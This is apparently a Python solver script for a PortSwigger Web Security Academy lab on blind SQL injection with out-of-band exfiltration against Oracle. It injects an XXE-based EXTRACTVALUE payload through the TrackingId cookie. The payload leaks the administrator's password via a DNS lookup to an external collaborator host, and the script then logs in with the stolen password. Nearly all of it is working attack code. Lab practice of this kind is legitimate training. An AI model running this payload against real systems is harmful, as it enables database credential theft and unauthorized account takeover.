import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup
import urllib.parse

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
# db: OracleDB
# author: 0xyf


class SQLi17:
    def __init__(self):
        self.lab_id = "0a9f00e7040c701080e18002007f00bd"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.login_url = f"{self.url}/login"
        self.proxies = {"https": "http://127.0.0.1:8080"}
        self.collab_id = "9lvk6jj0uju6u7odoyc4j1tbo2uyipdd2"
        self.collab_url = f"http://{self.collab_id}.oastify.com"

        self.username = "administrator"

    def get_csrf_token(self):
        r = requests.get(f"{self.login_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies

    def execute_request(self, payload):
        payload = urllib.parse.quote(payload, safe="")
        cookies = {"TrackingId": payload}
        r = requests.get(self.url, proxies=self.proxies, cookies=cookies, verify=False)
        return r

    def dns_exfil_pw(self):
        payload = f"""'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.{self.collab_id}.oastify.com/"> %remote;]>'),'/l') FROM dual) -- -"""
        self.execute_request(payload)
        self.password = input("Enter password: <here>.collab_id.oastify.com ")

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def login(self):
        self.get_csrf_token()
        print(f"[*] Attempting to Login as {self.username}:{self.password}")
        data = {
            "username": self.username,
            "password": self.password,
            "csrf": self.csrf_token,
        }
        r = requests.post(
            self.login_url,
            cookies=self.cookies,
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        if r.status_code == 200:
            if "Invalid username or password." not in r.text:
                print(f"[*] valid combination {self.username}:{self.password}")

    def solve(self):
        self.dns_exfil_pw()
        self.login()
        self.check_solved()


def main():
    SQLi17().solve()


if __name__ == "__main__":
    main()
